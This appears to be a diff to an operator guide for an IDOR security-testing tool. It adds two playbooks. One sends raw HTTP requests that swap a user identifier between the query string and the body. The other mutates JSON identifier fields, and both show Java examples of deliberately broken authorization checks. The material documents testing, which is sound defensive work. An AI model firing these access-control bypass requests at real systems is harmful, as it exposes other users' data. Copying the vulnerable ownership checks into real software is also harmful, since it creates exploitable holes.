@@ -41,7 +41,9 @@ This page is meant to read like an operator guide, not just a registry dump. It 
   - [`idor.hybrid.truncated_identifier_variants`](#idorhybridtruncated_identifier_variants)
   - [`idor.hybrid.uuid_version_variants`](#idorhybriduuid_version_variants)
   - [`idor.hybrid.identifier_encoding`](#idorhybrididentifier_encoding)
+  - [`idor.hybrid.query_body_cross_source`](#idorhybridquery_body_cross_source)
   - [`idor.hybrid.method_override`](#idorhybridmethod_override)
+  - [`idor.body.json_edge_cases`](#idorbodyjson_edge_cases)
 - [Notes For Future Additions](#notes-for-future-additions)
 - [Documentation Rule](#documentation-rule)
 
@@ -1603,6 +1605,122 @@ if ("GET".equals(request.method())) {
 }
 
 return objectController.handle(request);
+```
+
+### `idor.hybrid.query_body_cross_source`
+
+Display name:
+`Query + Body Cross-Source`
+
+### Purpose
+
+This playbook exists because an auth check might read the identifier from the query string while the resolver reads from the request body (or vice versa). Many frameworks that accept GET requests will also parse a body if one is present, creating a cross-source disagreement.
+
+### Raw HTTP Examples
+
+```http
+GET /users/profile?id=wiener HTTP/2
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"id":"carlos"}
+```
+
+```http
+POST /users/profile?id=wiener HTTP/2
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/x-www-form-urlencoded
+
+id=carlos
+```
+
+```http
+PUT /users/profile?id=carlos HTTP/2
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"id":"wiener"}
+```
+
+Generates variants across 3 methods (GET, POST, PUT) × 3 body formats (JSON, URL-encoded, multipart) × both identifier directions, plus body-only variants with no query param.
+
+### What The Broken Target Code Might Look Like
+
+```java
+// Auth reads query, resolver reads body
+String checkedId = request.queryParam("id");
+requireOwnership(user, checkedId);
+
+JsonNode body = request.json();
+return objectService.load(body.get("id").asText());
+```
+
+### `idor.body.json_edge_cases`
+
+Display name:
+`JSON Edge Cases`
+
+### Purpose
+
+This playbook exists because JSON parsers and object binders handle malformed input, type confusion, encoding tricks, and structural edge cases inconsistently. A comprehensive set of ~40 mutations is applied to the identifier field to probe parser-specific behaviors.
+
+### Raw HTTP Examples
+
+```http
+POST /users/profile HTTP/2
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"id" "carlos"}
+```
+
+```http
+POST /users/profile HTTP/2
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"id": true}
+```
+
+```http
+POST /users/profile HTTP/2
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"ID":"carlos"}
+```
+
+```http
+POST /users/profile HTTP/2
+Host: target.example
+Cookie: session=user-session
+Content-Type: application/json
+
+{"id":"carlos\u200B"}
+```
+
+Covers: type confusion (boolean, null, number), malformed JSON (missing colon, extra comma, single quotes), case-sensitive keys, JSON injection in strings, environment variables (`${USER}`), structural edge cases (nested arrays, empty key, mixed-type arrays), Unicode (zero-width space/joiner, emoji), special characters (curly braces, backticks, plus, asterisk), and path traversal in value.
+
+### What The Broken Target Code Might Look Like
+
+```java
+// Parser tolerates malformed JSON or coerces types
+Object supplied = request.bindJsonLenient().get("id");
+return objectService.load(supplied.toString());
+```
+
+```java
+// Case-insensitive key lookup
+String id = body.entries().stream()
+    .filter(e -> e.getKey().equalsIgnoreCase("id"))
+    .map(Map.Entry::getValue)
+    .findFirst().orElse(null);
 ```
 
 ## Notes For Future Additions
